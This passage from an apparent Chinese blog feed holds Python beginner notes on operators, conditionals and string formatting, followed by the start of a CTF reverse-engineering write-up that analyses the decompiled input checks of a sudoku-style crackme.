等价于c=c+a</td></tr><tr><td>-=</td><td></td><td></td></tr><tr><td>*=</td><td></td><td></td></tr><tr><td>/=</td><td>除法赋值运算符</td><td>c/=a等价于 c=c/a</td></tr><tr><td>//=</td><td>整数赋值运算符</td><td>c//=a等价于 c=c//a</td></tr><tr><td>%=</td><td></td><td></td></tr><tr><td>**=</td><td>幂赋值运算符</td><td>c<strong>=a 等价与 c=c</strong>a  c的a次方</td></tr><tr><td>&gt; 先算符合符合运算符右侧的表达式，再算符合运算符运算的算数运算，最后算赋值运算</td><td></td><td></td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d=10</span><br><span class="line">d*=1+2   #相当于 d*=(1+2)</span><br></pre></td></tr></table></figure><ul><li><p>比较运算符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. ==</span><br><span class="line">2. !=</span><br><span class="line">3. &gt;</span><br><span class="line">4. &lt;</span><br><span class="line">5. &gt;=</span><br><span class="line">6. &lt;=</span><br></pre></td></tr></table></figure></li><li><p>逻辑运算符</p></li></ul><table><thead><tr><th>运算符</th><th>逻辑表达式</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>and</td><td>x and y</td><td>布尔”与” if x为flase，x and y返回 false 否则返回 y的值</td><td>True and False，返回 False</td></tr><tr><td>or</td><td>x or y</td><td>布尔”或” if x为True，x and y返回 True 否则返回 y的值</td><td>True and False，返回 True</td></tr><tr><td>not</td><td>not</td><td>布尔”非” if x为True，not x 返回 False。</td><td>not True 返回 False</td></tr></tbody></table><blockquote><p>注意 与操作 是与 并且 都不非零则返回最后一个非零数</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2 and 1 =1</span><br><span class="line">1 and 2 =2</span><br></pre></td></tr></table></figure><blockquote><p>注意 或操作 是与 并且 都不非零则返回第一一个非零数</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2 or 1 =2</span><br><span class="line">1 or 2 =1</span><br></pre></td></tr></table></figure><blockquote><p>最后拓个展</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#多个变量赋值   数量位置要对应相等</span><br><span class="line">num1,float1,str1=10,0.5,&apos;hello,world&apos;</span><br><span class="line">print(num1)</span><br><span class="line">print(float1)</span><br><span class="line">print(str1)</span><br><span class="line">#10</span><br><span class="line">#0.5</span><br><span class="line">#hello,world</span><br></pre></td></tr></table></figure><h1 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h1><h4 id="1-条件语句作用"><a href="#1-条件语句作用" class="headerlink" title="1. 条件语句作用"></a>1. 条件语句作用</h4><h3 id="2-if-语法"><a href="#2-if-语法" class="headerlink" title="2. if 语法"></a>2. if 语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if true:</span><br><span class="line">    print(&apos;条件成立执行的代码1&apos;)</span><br><span class="line">    print(&apos;条件成立执行的代码2&apos;)</span><br><span class="line">#下面的代码没有缩进到if 语句块，所以和if 条件无关</span><br><span class="line">print(&apos;我是无论条件是否成立都要执行的代码&apos;)</span><br></pre></td></tr></table></figure><h3 id="3-if…else…"><a href="#3-if…else…" class="headerlink" title="3. if…else…"></a>3. if…else…</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#系统输入用户年龄，用这个年龄来做一傲剑判断</span><br><span class="line">#1.用户输入</span><br><span class="line">#2.保存用户输入的年龄</span><br><span class="line">#3.if</span><br><span class="line">#注意：input()接收到的数据是str类型，不能与 整数18作比较--int()转换类型</span><br><span class="line"></span><br><span class="line">age=int(input(&quot;请输入您的年龄：&quot;))</span><br><span class="line">if age&gt;=18:</span><br><span class="line">    print(f&apos;您的年龄是&#123;age&#125;，已经成年，可以上网&apos;)</span><br><span class="line">else:</span><br><span class="line">    print(f&apos;您的年龄是&#123;age&#125;，小朋友，作业写完了没！&apos;)</span><br></pre></td></tr></table></figure><h3 id="4-多重判断"><a href="#4-多重判断" class="headerlink" title="4. 多重判断"></a>4. 多重判断</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">age = int(input(&apos;请输入你的年龄：&apos;))</span><br><span class="line">if age &lt;18:</span><br><span class="line">    print(f&apos;你的年龄是&#123;age&#125;，童工一枚&apos;)</span><br><span class="line">elif (age&gt;=18)and(age&lt;=60):</span><br><span class="line">    print(f&apos;你的年龄是&#123;age&#125;，合法工龄&apos;)</span><br><span class="line">elif age&gt;60:</span><br><span class="line">    print(f&apos;你的年龄是&#123;age&#125;，可以退休&apos;)</span><br></pre></td></tr></table></figure><blockquote><p>多重判断也可以和else 配合使用。一般else放在整个if 语句的最后，表示以上条件都不成立的时候，执行的代码！</p></blockquote><h3 id="5-if-嵌套"><a href="#5-if-嵌套" class="headerlink" title="5. if 嵌套"></a>5. if 嵌套</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">money=0</span><br><span class="line">seat=1</span><br><span class="line">if money ==1:</span><br><span class="line">    print(&apos;土豪，请上车！&apos;)</span><br><span class="line">    #判断能否坐下</span><br><span class="line">    if seat ==1:</span><br><span class="line">        print(&apos;有空坐，请坐！&apos;)</span><br><span class="line">    else:</span><br><span class="line">        print(&apos;暂时没有空座，站着等会！&apos;)</span><br><span class="line">else:</span><br><span class="line">    print(&apos;朋友，出门要记得带钱啊！&apos;)</span><br></pre></td></tr></table></figure><h3 id="6-综合实例"><a href="#6-综合实例" class="headerlink" title="6. 综合实例"></a>6. 综合实例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line">player = int(input(&apos;请出拳：0--石头；1--剪刀；2--布&apos;))</span><br><span class="line">computer = random.randint(0,2)#导入模块，使用这个模块中的功能 (0,2)前后都包括</span><br><span class="line"></span><br><span class="line">if((player==0)and(computer==1) or(player==1)and(computer==2) or (player==2)and(computer==0) ):</span><br><span class="line">    print(&apos;玩家获胜，哈哈哈&apos;)</span><br><span class="line">elif player ==computer:</span><br><span class="line">    print(&apos;平局，别走，再来一局&apos;)</span><br><span class="line">else:</span><br><span class="line">    print(&apos;电脑获胜！&apos;)</span><br><span class="line">#这里有个随机的做法</span><br><span class="line">#1.导出random模块   import 模块名</span><br><span class="line">#2.使用random模块中的功能 randint(开始，结束)</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/07/23/eAZRsg.jpg" alt="eAZRsg.jpg"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;其实，今天让我心里感到安慰的是  学会了使用idc dump数据！但明天再整理吧！&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python系统学习00</title>
    <link href="http://yoursite.com/2019/09/16/python%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A000/"/>
    <id>http://yoursite.com/2019/09/16/python系统学习00/</id>
    <published>2019-09-15T16:22:17.000Z</published>
    <updated>2019-09-28T14:37:14.142Z</updated>
    
    <content type="html"><![CDATA[<p>python经常会用到的，虽然萝卜建议不系统学，但系统学完后会有成就感呐！所以，来吧！//基于python 3.x</p><a id="more"></a><h2 id="注释"><a href="#注释" class="headerlink" title="注释:"></a>注释:</h2><ol><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//</span><br></pre></td></tr></table></figure></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;&apos;</span><br><span class="line">print(&apos;hello&apos;)</span><br><span class="line">print(&apos;hello,world!&apos;)</span><br><span class="line">&apos;&apos;&apos;</span><br></pre></td></tr></table></figure></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;&quot;</span><br><span class="line">print(&apos;hello&apos;)</span><br><span class="line">print(&apos;hello,world!&apos;)</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure></li></ol><h2 id="变量-数据类型"><a href="#变量-数据类型" class="headerlink" title="变量//数据类型"></a>变量//数据类型</h2><ol><li>整型:int</li><li>浮点型：float</li><li>字符串：str</li><li>布尔型：bool</li><li>元组：tuple</li><li>集合：set</li><li>字典（键值对）：dict</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//type()函数返回数据类型</span><br><span class="line">name=&apos;mutou&apos;</span><br><span class="line">print(type(name))</span><br><span class="line">#&lt;type &apos;str&apos;&gt;</span><br></pre></td></tr></table></figure><h2 id="格式化输出："><a href="#格式化输出：" class="headerlink" title="格式化输出："></a>格式化输出：</h2><h3 id="格式符号"><a href="#格式符号" class="headerlink" title="格式符号"></a>格式符号</h3><p><img src="https://s2.ax1x.com/2019/09/16/nRigzj.png" alt="nRigzj.png"></p><h3 id="技巧："><a href="#技巧：" class="headerlink" title="技巧："></a>技巧：</h3><ol><li><p>%06d，表示输出的整数显示位数，不足以0 不全，超过当前位数则原样输出</p></li><li><p>%0.2f,表示小数点后显示的小数位数</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf8</span><br><span class="line">age=20</span><br><span class="line">name=&apos;mutou&apos;</span><br><span class="line">weight=75.5</span><br><span class="line">stu_id=1</span><br><span class="line"></span><br><span class="line">print(&apos;我的名字是%s&apos; %name)</span><br><span class="line">#我的名字是mutou</span><br><span class="line">print(&apos;我的今年%d岁&apos; %age)</span><br><span class="line">#我的今年20岁</span><br><span class="line">print(&apos;我的名字是%s,今年%d岁&apos; %(name,age))</span><br><span class="line">#我的名字是mutou,今年20岁</span><br><span class="line">print(&apos;我的名字是%s,我今年%d岁,体重是%.2f公斤,学号是%06d&apos; %(name,age,weight,stu_id))</span><br><span class="line">#我的名字是mutou,我今年20岁,体重是75.50公斤,学号是000001</span><br></pre></td></tr></table></figure><h2 id="格式化字符串拓展"><a href="#格式化字符串拓展" class="headerlink" title="格式化字符串拓展"></a>格式化字符串拓展</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#可以看出 %s的强大之处！</span><br><span class="line">#coding:utf8</span><br><span class="line">age=20</span><br><span class="line">name=&apos;mutou&apos;</span><br><span class="line">weight=75.5</span><br><span class="line">name=&apos;mutou&apos;</span><br><span class="line">print(&apos;我的名字是%s,今年%s岁,体重%s&apos; %(name,age,weight))</span><br></pre></td></tr></table></figure><h2 id="f格式化字符串："><a href="#f格式化字符串：" class="headerlink" title="f格式化字符串："></a>f格式化字符串：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#f-格式化字符串是Python 3.6中新增的格式化方法，该方法更简单易读！</span><br><span class="line">age=20</span><br><span class="line">name=&apos;mutou&apos;</span><br><span class="line">print(&apos;我的名字是%s,今年%d岁&apos; %(name,age))</span><br><span class="line">#我的名字是mutou,今年20岁</span><br><span class="line">print(f&apos;我的名字是&#123;name&#125;,今年&#123;age&#125;岁&apos;)</span><br><span class="line">#我的名字是mutou,今年20岁</span><br></pre></td></tr></table></figure><h2 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf8</span><br><span class="line">print(&quot;hello\nworld!&quot;)#  \ 叫作 反斜杠</span><br><span class="line"></span><br><span class="line"># hello</span><br><span class="line"># world!</span><br><span class="line">print(&quot;helloworld!&quot;)</span><br><span class="line">#helloworld!</span><br><span class="line">print(&quot;hello\tworld!&quot;) #制表符 四个空格长度</span><br><span class="line">#helloworld!</span><br></pre></td></tr></table></figure><h2 id="print结束符"><a href="#print结束符" class="headerlink" title="print结束符"></a>print结束符</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#结束符用户可以修改</span><br><span class="line">#coding:utf8</span><br><span class="line">print(&apos;hello&apos;, end=&quot;\t&quot;)</span><br><span class="line">print(&apos;world&apos;, end=&quot;......&quot;)</span><br><span class="line">print(&apos;hello&apos;, end=&quot; &quot;)</span><br><span class="line">print(&apos;world&apos;, end=&quot;真好&quot;)</span><br><span class="line">#helloworld......hello world真好</span><br></pre></td></tr></table></figure><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><blockquote><p>格式化符号</p></blockquote><ol><li>%s:格式化输出字符串</li><li>%d:格式化输出整数</li><li>%f：格式化输出浮点数</li></ol><blockquote><p>f-字符串</p></blockquote><ol><li>f{‘表达式’}</li></ol><blockquote><p>转义字符</p></blockquote><ol><li>\n:换行</li><li>\t:制表符</li></ol><blockquote><p>print结束符</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(&apos;内容&apos;,end=&quot;&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/09/16/nRiWyn.jpg" alt="nRiWyn.jpg"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;python经常会用到的，虽然萝卜建议不系统学，但系统学完后会有成就感呐！所以，来吧！//基于python 3.x&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>CG CTF re部分题解3</title>
    <link href="http://yoursite.com/2019/09/15/CG%20CTF%20re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A33/"/>
    <id>http://yoursite.com/2019/09/15/CG CTF re部分题解3/</id>
    <published>2019-09-15T15:09:02.000Z</published>
    <updated>2019-09-15T15:13:01.575Z</updated>
    
    <content type="html"><![CDATA[<p>虽然在过程中学到了很多，不过总是觉得好慢，还要学的东西太多了，不能细算！慢慢学，就总会好的！下面记录了CF CTF的single和maze 两道逆向题！</p><a id="more"></a><h2 id="single"><a href="#single" class="headerlink" title="single"></a>single</h2><p>拖入ida  F12</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">LOAD:00000000004002380000001CC/lib64/ld-linux-x86-64.so.2</span><br><span class="line">LOAD:00000000004003A90000000AClibc.so.6</span><br><span class="line">LOAD:00000000004003B300000005Cexit</span><br><span class="line">LOAD:00000000004003B800000005Cputs</span><br><span class="line">LOAD:00000000004003BD00000011C__stack_chk_fail</span><br><span class="line">LOAD:00000000004003CE00000007Cprintf</span><br><span class="line">LOAD:00000000004003D500000007Cstrlen</span><br><span class="line">LOAD:00000000004003DC00000007Cmemset</span><br><span class="line">LOAD:00000000004003E300000006Cscanf</span><br><span class="line">LOAD:00000000004003E900000012C__libc_start_main</span><br><span class="line">LOAD:00000000004003FB0000000FC__gmon_start__</span><br><span class="line">LOAD:000000000040040A0000000ACGLIBC_2.4</span><br><span class="line">LOAD:00000000004004140000000CCGLIBC_2.2.5</span><br><span class="line">.rodata:0000000000400C480000000ECInput string:</span><br><span class="line">.rodata:0000000000400C5900000011CCongratulations!</span><br><span class="line">.rodata:0000000000400C6A00000009Cflag&#123;%s&#125;</span><br><span class="line">.eh_frame:0000000000400D4700000006C;*3$\&quot;</span><br></pre></td></tr></table></figure><p>双击 Input string: 进入它在数据段的位置，然后按 X 转到 引用使用它的地方 再F5大法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [rsp+0h] [rbp-70h]</span><br><span class="line">  unsigned __int64 v5; // [rsp+68h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  memset(&amp;s, 0, 0x64uLL);                       // &amp;s处先初始化 0</span><br><span class="line">  puts(&quot;Input string:&quot;);</span><br><span class="line">  scanf(&quot;%s&quot;, &amp;s);                              // 输入字符串 存在&amp;s处</span><br><span class="line">  sub_40070E(&amp;s);</span><br><span class="line">  sub_40078B(&amp;s, (__int64)word_602080);</span><br><span class="line">  sub_400AD4((__int64)word_602080);</span><br><span class="line">  puts(&quot;Congratulations!&quot;);</span><br><span class="line">  printf(&quot;flag&#123;%s&#125;&quot;, &amp;s);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到输入的字符串经过了sub_40070E函数，sub_40078B函数，sub_400AD4函数处理（操作）。我们分别进入看下函数都是做了些什么？<br>首先sub_40070E函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// al为 输入字符串存储地址</span><br><span class="line">size_t __fastcall sub_40070E(const char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  size_t result; // rax</span><br><span class="line">  int i; // [rsp+1Ch] [rbp-14h]</span><br><span class="line"></span><br><span class="line">  if ( strlen(a1) &gt; 0x51 )                      // 字符串长度 不能 &gt; 0x51</span><br><span class="line">    sub_4006F6();                               // 运行错误</span><br><span class="line">  for ( i = 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = strlen(a1);</span><br><span class="line">    if ( i &gt;= result )</span><br><span class="line">      break;</span><br><span class="line">    if ( a1[i] &lt;= 47 || a1[i] &gt; 57 )            // 输入字符串的每个字符要在  47-57间  即0-9字符</span><br><span class="line">      sub_4006F6();</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以知道上面这个函数是对我们输入字符串的限制：</p><ol><li>输入字符串要&lt;=0x51（十进制：81）</li><li>输入的字符 只能是  0-9 字符 （ ASCII序号为（48，…,57 ））<br>我们接下来看下sub_40078B函数</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">size_t __fastcall sub_40078B(const char *a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  size_t result; // rax</span><br><span class="line">  int i; // [rsp+1Ch] [rbp-14h]</span><br><span class="line"></span><br><span class="line">  for ( i = 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = strlen(a1);                        // result=输入字符串长度</span><br><span class="line">    if ( i &gt;= result )</span><br><span class="line">      break;</span><br><span class="line">    if ( a1[i] != 48 )                          // 如果输入字符串[i]!=&apos;0&apos;</span><br><span class="line">    &#123;</span><br><span class="line">      if ( !a1[i] || *(_BYTE *)(i + a2) )       // a2[i]双字的最后一个字节 !=&apos;0&apos;</span><br><span class="line">        sub_4006F6();                           // 我们记下a2[i]==0的位置，则我们输入字符串[i]就必须等于&apos;0&apos;</span><br><span class="line">      *(_BYTE *)(i + a2) = a1[i] - 48;          // a2[i]双字的最后一字节=输入字符串[i]（0-9）</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这个函数主要是将我们输入的字符（减去48了，更应该叫数字（0-9））以位赋值给a2(已经存在的双字串) ；这里注意：当我们输入0的话就用赋值了；<br>这门可以看下a2未赋值前的原始数据是怎样的！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0,   3,   0,   6,   0,   0,   0,   0,   0,   6, </span><br><span class="line">   0,   0,   0,   3,   2,   4,   9,   0,   0,   9, </span><br><span class="line">   0,   1,   0,   7,   0,   6,   0,   7,   4,   6, </span><br><span class="line">   0,   0,   0,   0,   0,   0,   0,   1,   8,   0, </span><br><span class="line">   0,   0,   6,   3,   0,   0,   0,   0,   0,   0, </span><br><span class="line">   0,   1,   4,   7,   0,   8,   0,   9,   0,   4, </span><br><span class="line">   0,   7,   0,   0,   7,   4,   2,   1,   0,   0, </span><br><span class="line">   0,   6,   0,   0,   0,   0,   0,   3,   0,   1, </span><br><span class="line">   0</span><br></pre></td></tr></table></figure><p>我们接着看sub_400AD4()(__int64)word_602080函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_400AD4(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  sub_400833(a1);</span><br><span class="line">  sub_4008FE(a1);</span><br><span class="line">  return sub_4009C9(a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>里面有两个函数 我们进去sub_400833(a1)看下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall sub_400833(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  signed int i; // [rsp+18h] [rbp-28h]</span><br><span class="line">  signed int j; // [rsp+1Ch] [rbp-24h]</span><br><span class="line">  signed int k; // [rsp+1Ch] [rbp-24h]</span><br><span class="line">  char s[24]; // [rsp+20h] [rbp-20h]</span><br><span class="line">  unsigned __int64 v6; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  for ( i = 0; i &lt;= 8; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    memset(s, 0, 0xAuLL);</span><br><span class="line">    for ( j = 0; j &lt;= 8; ++j )</span><br><span class="line">      ++s[*(unsigned __int8 *)(9 * i + j + a1)];</span><br><span class="line">      //相当于s[a1[i][j]+，即综合下面for（k）循环可知道这个意思是：每行必须由 1-9九个数组成</span><br><span class="line">    for ( k = 1; k &lt;= 9; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( s[k] != 1 )</span><br><span class="line">        sub_4006F6();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即每行必须由 1-9九个数组成<br>接着看下sub_4008FE(al)函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall sub_4008FE(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  signed int i; // [rsp+18h] [rbp-28h]</span><br><span class="line">  signed int j; // [rsp+1Ch] [rbp-24h]</span><br><span class="line">  signed int k; // [rsp+1Ch] [rbp-24h]</span><br><span class="line">  char s[24]; // [rsp+20h] [rbp-20h]</span><br><span class="line">  unsigned __int64 v6; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  for ( i = 0; i &lt;= 8; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    memset(s, 0, 0xAuLL);</span><br><span class="line">    for ( j = 0; j &lt;= 8; ++j )</span><br><span class="line">      ++s[*(unsigned __int8 *)(9 * j + i + a1)];</span><br><span class="line">    for ( k = 1; k &lt;= 9; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( s[k] != 1 )</span><br><span class="line">        sub_4006F6();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以很容易地看到和sub_400833(a1)很类似，这个函数的意思就是每个列必须由1-9这9个数字组成！</p><p>这两个函数分析完后我们又回到<br>我们最后再看下sub_400AD4函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall sub_400AD4(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  sub_400833(a1);</span><br><span class="line">  sub_4008FE(a1);</span><br><span class="line">  return sub_4009C9(a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析这两个函数 return sub_4009C9(a1)了，哈哈，这样看来函数还挺多！ 我们进去分析：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 